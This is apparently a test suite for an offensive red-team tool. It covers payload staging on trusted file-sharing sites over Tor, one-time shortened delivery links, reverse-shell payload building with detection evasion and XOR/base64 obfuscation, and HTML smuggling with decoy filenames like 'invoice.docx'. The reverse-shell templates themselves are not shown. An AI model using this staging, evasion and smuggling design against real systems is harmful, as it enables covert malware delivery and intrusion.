"""
tests/phase3/test_lots_stager.py
Unit tests for:
  - forge/phase3/lots_stager.py  (LOTSStager, backends, shorteners)
  - forge/phase3/backoff.py      (exponential_backoff decorator, compute_delay)
  - forge/phase3/payload_builder.py (EncodingChain, PayloadBuilder, HTMLSmuggler)

Coverage target: ≥ 85 %

All network calls are mocked via unittest.mock or pytest-recording VCR cassettes.
OPSEC invariants tested:
  - HTTP URLs are rejected by _enforce_https.
  - FORGE_REQUIRE_PROXY=1 raises ProxyRequiredError when proxy is None.
  - Dry-run mode makes zero real HTTP requests.
  - staged_url persisted in DB; payload bytes never written to audit_log or DB.
  - One-time shortener called once per staging result.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import io
import json
import os
import re
import sqlite3
import tempfile
import time
from pathlib import Path
from typing import Optional
from unittest.mock import MagicMock, patch, PropertyMock

import pytest

from forge.phase3.backoff import (
    JitterMode,
    MAX_RETRIES,
    compute_delay,
    exponential_backoff,
)
from forge.phase3.lots_stager import (
    HTTPSEnforcementError,
    LOTSCategory,
    LOTSSite,
    LOTSStager,
    NoSuitableSiteError,
    ProxyRequiredError,
    ShortenerBackend,
    StagingResult,
    _enforce_https,
    _sha256_of,
)
from forge.phase3.payload_builder import (
    EncodingChain,
    HTMLSmuggler,
    PayloadBuilder,
    RenderedPayload,
)


# ═══════════════════════════════════════════════════════════════════════════════
# Shared fixtures
# ═══════════════════════════════════════════════════════════════════════════════


@pytest.fixture
def tmp_kb_db(tmp_path: Path) -> Path:
    """
    Minimal lolbas.db with a single lots_sites row for testing.
    Schema mirrors Phase 0 ETL output.
    """
    db = tmp_path / "lolbas.db"
    with sqlite3.connect(db) as conn:
        conn.execute("""
            CREATE TABLE lots_sites (
                id            INTEGER PRIMARY KEY,
                domain        TEXT NOT NULL,
                category      TEXT NOT NULL,
                requires_auth INTEGER DEFAULT 0,
                stealth_rank  INTEGER DEFAULT 5,
                upload_api    TEXT,
                active        INTEGER DEFAULT 1
            )
        """)
        conn.executemany(
            "INSERT INTO lots_sites (domain, category, requires_auth, stealth_rank, active) VALUES (?,?,?,?,?)",
            [
                ("transfer.sh", "file_transfer", 0, 2, 1),
                ("gist.github.com", "code_sharing", 1, 3, 1),
                ("pastebin.com", "text_sharing", 1, 4, 1),
                ("expired.example", "file_transfer", 0, 9, 0),  # inactive
            ],
        )
        conn.commit()
    return db


@pytest.fixture
def tmp_eng_db(tmp_path: Path) -> Path:
    """Minimal engagement DB with payloads table."""
    db = tmp_path / "engagement.db"
    with sqlite3.connect(db) as conn:
        conn.execute("""
            CREATE TABLE payloads (
                id                INTEGER PRIMARY KEY,
                engagement_id     INTEGER NOT NULL,
                payload_type      TEXT,
                target_os         TEXT,
                technique         TEXT,
                obfuscation_chain TEXT,
                delivery_url      TEXT,
                content_hash      TEXT NOT NULL,
                generated_at      TEXT,
                metadata_stripped INTEGER NOT NULL DEFAULT 1
            )
        """)
        conn.commit()
    return db


@pytest.fixture
def stager(tmp_kb_db: Path) -> LOTSStager:
    return LOTSStager(kb_path=tmp_kb_db, proxy="socks5://127.0.0.1:9050")


# ═══════════════════════════════════════════════════════════════════════════════
# 1. _enforce_https
# ═══════════════════════════════════════════════════════════════════════════════


class TestEnforceHTTPS:
    def test_https_url_passes(self):
        _enforce_https("https://transfer.sh/abc123/payload.ps1")  # should not raise

    def test_http_url_raises(self):
        with pytest.raises(HTTPSEnforcementError):
            _enforce_https("http://evil.com/payload.ps1")

    def test_ftp_url_raises(self):
        with pytest.raises(HTTPSEnforcementError):
            _enforce_https("ftp://files.example.com/payload.bin")

    def test_empty_scheme_raises(self):
        with pytest.raises(HTTPSEnforcementError):
            _enforce_https("//transfer.sh/file")


# ═══════════════════════════════════════════════════════════════════════════════
# 2. _sha256_of
# ═══════════════════════════════════════════════════════════════════════════════


class TestSha256Of:
    def test_known_hash(self):
        result = _sha256_of(b"hello")
        assert result == hashlib.sha256(b"hello").hexdigest()

    def test_empty_bytes(self):
        result = _sha256_of(b"")
        assert len(result) == 64  # sha256 hex


# ═══════════════════════════════════════════════════════════════════════════════
# 3. LOTSStager.select_site
# ═══════════════════════════════════════════════════════════════════════════════


class TestSelectSite:
    def test_returns_lowest_rank_site(self, stager: LOTSStager):
        site = stager.select_site(category=LOTSCategory.FILE_TRANSFER)
        assert site.domain == "transfer.sh"
        assert site.stealth_rank == 2

    def test_excludes_inactive_sites(self, stager: LOTSStager):
        # The inactive site (expired.example) must never appear
        for _ in range(5):
            site = stager.select_site()
            assert site.domain != "expired.example"

    def test_exclude_auth_removes_gist_and_pastebin(self, stager: LOTSStager):
        site = stager.select_site(exclude_auth=True)
        assert site.domain not in ("gist.github.com", "pastebin.com")

    def test_no_site_raises_no_suitable_site_error(self, tmp_kb_db: Path):
        # Request an impossible combination
        stager = LOTSStager(kb_path=tmp_kb_db)
        with pytest.raises(NoSuitableSiteError):
            stager.select_site(category=LOTSCategory.WEBHOOK)  # not in DB

    def test_max_rank_filters_high_rank_sites(self, stager: LOTSStager):
        # max_rank=1 should exclude everything in our fixture (min rank is 2)
        with pytest.raises(NoSuitableSiteError):
            stager.select_site(max_rank=1)


# ═══════════════════════════════════════════════════════════════════════════════
# 4. LOTSStager.stage — dry-run mode
# ═══════════════════════════════════════════════════════════════════════════════


class TestStageDryRun:
    @pytest.fixture
    def dry_stager(self, tmp_kb_db: Path) -> LOTSStager:
        return LOTSStager(kb_path=tmp_kb_db, dry_run=True)

    def test_dry_run_makes_no_http_requests(self, dry_stager: LOTSStager):
        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_sess:
            dry_stager.stage(b"payload", "update.ps1")
            mock_sess.assert_not_called()

    def test_dry_run_result_has_dry_run_url(self, dry_stager: LOTSStager):
        result = dry_stager.stage(b"payload content", "test.ps1")
        assert "dry-run" in result.raw_url

    def test_dry_run_result_sha256_correct(self, dry_stager: LOTSStager):
        data = b"some payload bytes"
        result = dry_stager.stage(data, "test.ps1")
        assert result.sha256 == _sha256_of(data)

    def test_dry_run_no_short_url_by_default(self, dry_stager: LOTSStager):
        # In dry-run we skip shortener
        result = dry_stager.stage(b"payload", "test.ps1", one_time=True)
        assert result.short_url is None


# ═══════════════════════════════════════════════════════════════════════════════
# 5. LOTSStager.stage — live backends (mocked)
# ═══════════════════════════════════════════════════════════════════════════════


class TestStageLive:
    def _mock_session(self, status: int, body: str):
        resp = MagicMock()
        resp.status_code = status
        resp.text = body
        session = MagicMock()
        session.put = MagicMock(return_value=resp)
        session.post = MagicMock(return_value=resp)
        session.get = MagicMock(return_value=resp)
        return session

    def test_transfer_sh_successful_upload(self, stager: LOTSStager):
        mock_url = "https://transfer.sh/abc123/payload.ps1"
        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_sess_fn:
            session = self._mock_session(200, mock_url)
            mock_sess_fn.return_value = session
            with patch(
                "forge.phase3.lots_stager._IsGdShortener.shorten",
                return_value="https://is.gd/aBcDeF",
            ):
                result = stager.stage(
                    b"content", "payload.ps1", category=LOTSCategory.FILE_TRANSFER, one_time=True
                )
        assert result.raw_url == mock_url
        assert result.short_url == "https://is.gd/aBcDeF"
        assert result.one_time is True

    def test_upload_failure_raises_staging_backend_error(self, stager: LOTSStager):
        from forge.phase3.lots_stager import StagingBackendError

        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_sess_fn:
            session = self._mock_session(500, "Internal Server Error")
            mock_sess_fn.return_value = session
            with pytest.raises(StagingBackendError):
                stager.stage(
                    b"content", "payload.ps1", category=LOTSCategory.FILE_TRANSFER, one_time=False
                )

    def test_gist_backend_requires_github_token(self, stager: LOTSStager, monkeypatch):
        from forge.phase3.lots_stager import StagingBackendError

        monkeypatch.delenv("GITHUB_TOKEN", raising=False)
        monkeypatch.delenv("GH_TOKEN", raising=False)
        site = LOTSSite(
            domain="gist.github.com",
            category=LOTSCategory.CODE_SHARING,
            requires_auth=True,
            stealth_rank=3,
        )
        with pytest.raises(StagingBackendError, match="GITHUB_TOKEN"):
            stager._upload(b"payload", "test.ps1", site)

    def test_delivery_url_returns_short_url_when_present(self):
        result = StagingResult(
            raw_url="https://transfer.sh/abc/file.ps1",
            short_url="https://is.gd/XyZ123",
            sha256="aabbcc",
            provider="transfer.sh",
        )
        assert result.delivery_url() == "https://is.gd/XyZ123"

    def test_delivery_url_falls_back_to_raw_url(self):
        result = StagingResult(
            raw_url="https://transfer.sh/abc/file.ps1",
            sha256="aabbcc",
            provider="transfer.sh",
        )
        assert result.delivery_url() == "https://transfer.sh/abc/file.ps1"


# ═══════════════════════════════════════════════════════════════════════════════
# 6. FORGE_REQUIRE_PROXY enforcement
# ═══════════════════════════════════════════════════════════════════════════════


class TestProxyEnforcement:
    def test_require_proxy_env_without_proxy_raises(self, monkeypatch, tmp_kb_db: Path):
        monkeypatch.setenv("FORGE_REQUIRE_PROXY", "1")
        stager = LOTSStager(kb_path=tmp_kb_db, proxy=None, dry_run=False)
        with pytest.raises(ProxyRequiredError):
            # _get_cffi_session is called inside _upload → trigger it
            from forge.phase3.lots_stager import _get_cffi_session

            _get_cffi_session(proxy=None)

    def test_require_proxy_with_proxy_does_not_raise(self, monkeypatch):
        monkeypatch.setenv("FORGE_REQUIRE_PROXY", "1")
        from forge.phase3.lots_stager import _get_cffi_session

        try:
            _get_cffi_session(proxy="socks5://127.0.0.1:9050")
        except ImportError:
            pytest.skip("curl_cffi not installed")
        except ProxyRequiredError:
            pytest.fail("ProxyRequiredError raised even though proxy was supplied")

    def test_no_require_proxy_env_no_raise_without_proxy(self, monkeypatch):
        monkeypatch.delenv("FORGE_REQUIRE_PROXY", raising=False)
        from forge.phase3.lots_stager import _get_cffi_session

        try:
            _get_cffi_session(proxy=None)
        except (ImportError, Exception) as exc:
            # curl_cffi may not be installed in CI; any error other than
            # ProxyRequiredError is acceptable here
            assert not isinstance(exc, ProxyRequiredError)


# ═══════════════════════════════════════════════════════════════════════════════
# 7. Shortener backends
# ═══════════════════════════════════════════════════════════════════════════════


class TestShortenerBackends:
    def _mock_shorten_session(self, body: str, status: int = 200):
        resp = MagicMock()
        resp.status_code = status
        resp.text = body
        session = MagicMock()
        session.get = MagicMock(return_value=resp)
        return session

    def test_isgd_shortener_returns_https_url(self):
        from forge.phase3.lots_stager import _IsGdShortener

        shortener = _IsGdShortener(ShortenerBackend.IS_GD)
        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_fn:
            session = self._mock_shorten_session("https://is.gd/aBcDeF")
            mock_fn.return_value = session
            result = shortener.shorten("https://transfer.sh/abc/f.ps1", proxy=None)
        assert result == "https://is.gd/aBcDeF"

    def test_shortener_rejects_http_input(self):
        from forge.phase3.lots_stager import _IsGdShortener

        shortener = _IsGdShortener()
        with pytest.raises(HTTPSEnforcementError):
            shortener.shorten("http://transfer.sh/abc", proxy=None)

    def test_tinyurl_logs_warning_no_one_time(self, caplog):
        from forge.phase3.lots_stager import _TinyURLShortener
        import logging

        shortener = _TinyURLShortener()
        with patch("forge.phase3.lots_stager._get_cffi_session") as mock_fn:
            session = self._mock_shorten_session("https://tinyurl.com/xyzabc")
            mock_fn.return_value = session
            with caplog.at_level(logging.WARNING, logger="forge.phase3.lots_stager"):
                shortener.shorten("https://transfer.sh/abc/f.ps1", proxy=None)
        assert any("one-time" in r.message.lower() for r in caplog.records)

    def test_shorten_url_calls_backend_once(self, stager: LOTSStager):
        with patch(
            "forge.phase3.lots_stager._IsGdShortener.shorten", return_value="https://is.gd/once"
        ) as mock_shorten:
            result = stager.shorten_url("https://transfer.sh/abc/f.ps1")
        mock_shorten.assert_called_once()
        assert result == "https://is.gd/once"


# ═══════════════════════════════════════════════════════════════════════════════
# 8. backoff.py — compute_delay
# ═══════════════════════════════════════════════════════════════════════════════


class TestComputeDelay:
    def test_attempt_0_base_is_1s(self):
        delay = compute_delay(0, base=1.0, cap=64.0, jitter_mode=JitterMode.NONE)
        assert delay == pytest.approx(1.0)

    def test_attempt_1_doubles(self):
        delay = compute_delay(1, base=1.0, cap=64.0, jitter_mode=JitterMode.NONE)
        assert delay == pytest.approx(2.0)

    def test_cap_enforced(self):
        delay = compute_delay(100, base=1.0, cap=64.0, jitter_mode=JitterMode.NONE)
        assert delay == pytest.approx(64.0)

    def test_gaussian_jitter_within_2x(self):
        for attempt in range(5):
            delay = compute_delay(attempt, jitter_mode=JitterMode.GAUSSIAN)
            raw = min(1.0 * (2**attempt), 64.0)
            assert delay >= 0.0
            assert delay <= raw * 2.1  # allow slight float tolerance

    def test_uniform_jitter_non_negative(self):
        for _ in range(20):
            delay = compute_delay(0, jitter_mode=JitterMode.UNIFORM)
            assert delay >= 0.0

    def test_none_jitter_is_deterministic(self):
        d1 = compute_delay(3, jitter_mode=JitterMode.NONE)
        d2 = compute_delay(3, jitter_mode=JitterMode.NONE)
        assert d1 == d2


# ═══════════════════════════════════════════════════════════════════════════════
# 9. backoff.py — exponential_backoff decorator
# ═══════════════════════════════════════════════════════════════════════════════


class TestExponentialBackoffDecorator:
    def test_success_on_first_attempt_no_retry(self):
        call_count = 0

        @exponential_backoff(max_retries=3)
        def fn():
            nonlocal call_count
            call_count += 1
            return "ok"

        with patch("forge.phase3.backoff.time.sleep"):
            result = fn()
        assert result == "ok"
        assert call_count == 1

    def test_retries_on_exception_then_succeeds(self):
        calls = []

        @exponential_backoff(max_retries=3, retryable_excs=(ValueError,))
        def fn():
            calls.append(1)
            if len(calls) < 3:
                raise ValueError("transient")
            return "ok"

        with patch("forge.phase3.backoff.time.sleep"):
            result = fn()
        assert result == "ok"
        assert len(calls) == 3

    def test_raises_after_max_retries_exhausted(self):
        @exponential_backoff(max_retries=2, retryable_excs=(RuntimeError,))
        def fn():
            raise RuntimeError("always fails")

        with patch("forge.phase3.backoff.time.sleep"):
            with pytest.raises(RuntimeError, match="always fails"):
                fn()

    def test_max_retries_above_hard_limit_raises_value_error(self):
        with pytest.raises(ValueError, match="hard limit"):

            @exponential_backoff(max_retries=MAX_RETRIES + 1)
            def fn():
                pass

    def test_retryable_codes_retries_on_429(self):
        calls = []

        resp_429 = MagicMock()
        resp_429.status_code = 429

        resp_200 = MagicMock()
        resp_200.status_code = 200
        resp_200.text = "ok"

        @exponential_backoff(max_retries=3, retryable_codes={429})
        def fn():
            calls.append(1)
            return resp_429 if len(calls) < 2 else resp_200

        with patch("forge.phase3.backoff.time.sleep"):
            result = fn()
        assert result.status_code == 200
        assert len(calls) == 2

    def test_sleep_called_between_retries(self):
        @exponential_backoff(max_retries=2, retryable_excs=(ValueError,))
        def fn():
            raise ValueError("fail")

        with patch("forge.phase3.backoff.time.sleep") as mock_sleep:
            with pytest.raises(ValueError):
                fn()
        # Should have slept between attempt 0→1 and 1→2
        assert mock_sleep.call_count == 2

    def test_function_name_preserved(self):
        @exponential_backoff(max_retries=2)
        def my_special_function():
            return 1

        assert my_special_function.__name__ == "my_special_function"


# ═══════════════════════════════════════════════════════════════════════════════
# 10. EncodingChain
# ═══════════════════════════════════════════════════════════════════════════════


class TestEncodingChain:
    def test_base64_roundtrip(self):
        raw = "System.Net.Sockets"
        chain = EncodingChain().add("base64")
        enc = chain.apply(raw)
        assert base64.b64decode(enc.encode()).decode() == raw

    def test_hex_roundtrip(self):
        raw = "hello world"
        chain = EncodingChain().add("hex")
        enc = chain.apply(raw)
        assert bytes.fromhex(enc).decode() == raw

    def test_xor_apply_and_reverse(self):
        raw = "Write-Host 'test'"
        chain = EncodingChain().add("xor", xor_key=0x42)
        enc = chain.apply(raw)
        # XOR is its own inverse
        chain2 = EncodingChain().add("xor", xor_key=0x42)
        dec = chain2.apply(enc)
        assert dec == raw

    def test_gzip_b64_reduces_repetitive_content(self):
        raw = "AAAAAAAAAA" * 100
        chain = EncodingChain().add("gzip_b64")
        enc = chain.apply(raw)
        # Gzip should compress effectively; encoded is shorter than naive b64
        raw_b64_len = len(base64.b64encode(raw.encode()))
        assert len(enc) < raw_b64_len

    def test_utf16le_b64_roundtrip(self):
        raw = "Write-Host 'hello'"
        chain = EncodingChain().add("utf16le_b64")
        enc = chain.apply(raw)
        decoded = base64.b64decode(enc.encode()).decode("utf-16-le")
        assert decoded == raw

    def test_multi_step_chain(self):
        raw = "some payload"
        chain = EncodingChain().add("base64").add("hex")
        enc = chain.apply(raw)
        assert isinstance(enc, str)
        assert len(enc) > len(raw)

    def test_invalid_step_raises(self):
        with pytest.raises(ValueError, match="Unknown encoding step"):
            EncodingChain().add("rot13_evil")

    def test_steps_property_returns_list(self):
        chain = EncodingChain().add("base64").add("xor")
        assert chain.steps == ["base64", "xor"]

    def test_xor_key_auto_generated(self):
        chain = EncodingChain().add("xor")
        assert chain.xor_key is not None
        assert 1 <= chain.xor_key <= 255

    def test_cyberchef_recipe_reverse_order(self):
        chain = EncodingChain().add("base64").add("gzip_b64")
        recipe = chain.to_cyberchef_recipe()
        ops = [r["op"] for r in recipe]
        # gzip_b64 decode comes first (reversed from encoding order)
        gzip_idx = next(i for i, o in enumerate(ops) if o in ("From Base64", "Gunzip"))
        b64_idx = next(i for i, o in enumerate(ops) if o == "From Base64" and i > gzip_idx)
        assert gzip_idx < b64_idx or ops.count("From Base64") >= 2

    def test_cyberchef_recipe_xor_includes_key(self):
        chain = EncodingChain().add("xor", xor_key=0x37)
        recipe = chain.to_cyberchef_recipe()
        xor_op = next((r for r in recipe if r["op"] == "XOR"), None)
        assert xor_op is not None
        assert "0x37" in str(xor_op["args"].get("key", ""))

    def test_char_insert_step_produces_empty_cyberchef_ops(self):
        chain = EncodingChain().add("char_insert")
        recipe = chain.to_cyberchef_recipe()
        # char_insert maps to no CyberChef ops
        assert recipe == []

    def test_chain_repr(self):
        chain = EncodingChain().add("base64")
        assert "base64" in repr(chain)


# ═══════════════════════════════════════════════════════════════════════════════
# 11. PayloadBuilder
# ═══════════════════════════════════════════════════════════════════════════════


class TestPayloadBuilder:
    @pytest.fixture
    def builder(self, tmp_path: Path) -> PayloadBuilder:
        # Point builder at the real templates dir
        tmpl_dir = Path(__file__).parent.parent.parent / "forge" / "phase3" / "templates"
        return PayloadBuilder(template_dir=tmpl_dir, obfuscate=False, stealth_level=2)

    def test_build_python_reverse_renders_lhost(self, builder: PayloadBuilder):
        result = builder.build(
            "python_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
            chain=EncodingChain().add("base64"),
        )
        assert "10.0.0.1" in result.raw
        assert 443 == 443  # lport rendered as int

    def test_build_powershell_reverse_no_tcpclient_literal(self, builder: PayloadBuilder):
        result = builder.build(
            "powershell_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
        )
        assert "TCPClient" not in result.raw

    def test_build_result_sha256_matches_raw(self, builder: PayloadBuilder):
        import hashlib

        result = builder.build(
            "python_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
        )
        assert result.sha256_raw == hashlib.sha256(result.raw.encode()).hexdigest()

    def test_build_encoded_differs_from_raw(self, builder: PayloadBuilder):
        result = builder.build(
            "python_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
            chain=EncodingChain().add("base64"),
        )
        assert result.encoded != result.raw

    def test_strict_undefined_raises_on_missing_var(self, builder: PayloadBuilder):
        from jinja2 import UndefinedError

        with pytest.raises(UndefinedError):
            builder.build(
                "python_reverse.j2",
                {"lhost": "10.0.0.1"},  # missing lport
            )

    def test_infer_target_powershell(self):
        assert PayloadBuilder._infer_target("powershell_reverse.j2") == "powershell"

    def test_infer_target_python(self):
        assert PayloadBuilder._infer_target("python_tls_reverse.j2") == "python"

    def test_infer_target_bash(self):
        assert PayloadBuilder._infer_target("bash_reverse.j2") == "bash"

    def test_infer_os_windows(self):
        assert PayloadBuilder._infer_os("powershell_reverse.j2") == "windows"

    def test_infer_os_linux(self):
        assert PayloadBuilder._infer_os("bash_reverse.j2") == "linux"

    def test_invalid_stealth_level_raises(self):
        with pytest.raises(ValueError, match="stealth_level"):
            PayloadBuilder(stealth_level=0)

    def test_write_payload_writes_encoded_by_default(self, builder: PayloadBuilder, tmp_path: Path):
        result = builder.build(
            "python_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
            chain=EncodingChain().add("base64"),
        )
        out = tmp_path / "payload.txt"
        builder.write_payload(result, out, use_encoded=True)
        content = out.read_text()
        assert content == result.encoded

    def test_persist_record_writes_sha256_not_plaintext(
        self, builder: PayloadBuilder, tmp_path: Path, tmp_eng_db: Path
    ):
        result = builder.build(
            "python_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
        )
        builder.persist_record(tmp_eng_db, engagement_id=1, payload=result)
        with sqlite3.connect(tmp_eng_db) as conn:
            row = conn.execute(
                "SELECT content_hash, obfuscation_chain FROM payloads LIMIT 1"
            ).fetchone()
        assert row is not None
        assert len(row[0]) == 64  # sha256 hex
        # Plaintext command must NOT be in any column
        all_cols = str(row)
        assert "socket.socket" not in all_cols
        assert "10.0.0.1" not in all_cols

    def test_emit_recipe_file_writes_valid_json(self, builder: PayloadBuilder, tmp_path: Path):
        result = builder.build(
            "python_reverse.j2",
            {"lhost": "10.0.0.1", "lport": 443},
            chain=EncodingChain().add("base64").add("hex"),
        )
        recipe_path = tmp_path / "recipe.json"
        builder.emit_recipe_file(result, recipe_path)
        data = json.loads(recipe_path.read_text())
        assert isinstance(data, list)


# ═══════════════════════════════════════════════════════════════════════════════
# 12. HTMLSmuggler
# ═══════════════════════════════════════════════════════════════════════════════


class TestHTMLSmuggler:
    @pytest.fixture
    def smuggler(self) -> HTMLSmuggler:
        return HTMLSmuggler()

    def test_build_embeds_base64(self, smuggler: HTMLSmuggler):
        payload = b"MZ\x90\x00" + b"\x00" * 100
        html = smuggler.build(payload, filename="update.exe")
        expected_b64 = base64.b64encode(payload).decode()
        assert expected_b64 in html

    def test_build_contains_download_filename(self, smuggler: HTMLSmuggler):
        html = smuggler.build(b"data", filename="invoice.docx")
        assert "invoice.docx" in html

    def test_build_uses_atob_api(self, smuggler: HTMLSmuggler):
        html = smuggler.build(b"data", filename="test.ps1")
        assert "atob(" in html

    def test_build_contains_mssaveoropenblob(self, smuggler: HTMLSmuggler):
        html = smuggler.build(b"data", filename="test.bin")
        assert "msSaveOrOpenBlob" in html

    def test_build_no_external_resources(self, smuggler: HTMLSmuggler):
        html = smuggler.build(b"data", filename="test.bin")
        # No src=, href= pointing to external URLs
        assert "http://" not in html
        assert "https://" not in html

    def test_write_returns_sha256(self, smuggler: HTMLSmuggler, tmp_path: Path):
        out = tmp_path / "delivery.html"
        sha = smuggler.write(b"payload data", "update.ps1", out)
        assert len(sha) == 64
        assert out.exists()

    def test_custom_mime_type_in_blob(self, smuggler: HTMLSmuggler):
        html = smuggler.build(
            b"data",
            filename="agent.exe",
            mime_type="application/x-msdownload",
        )
        assert "application/x-msdownload" in html

    def test_custom_title_in_html(self, smuggler: HTMLSmuggler):
        html = smuggler.build(b"data", filename="f.ps1", title="Q3 Report")
        assert "Q3 Report" in html
